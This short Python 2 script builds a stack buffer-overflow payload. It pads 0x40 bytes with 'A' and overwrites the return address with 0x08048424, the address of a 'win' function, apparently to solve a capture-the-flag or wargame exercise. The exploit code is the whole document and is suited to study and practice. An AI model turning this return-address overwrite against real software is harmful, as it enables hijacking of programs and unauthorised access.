#!/usr/bin/env python
import struct

padding = (0x5c-0x1c)*"A"
win = struct.pack("<I", 0x08048424)

print padding+win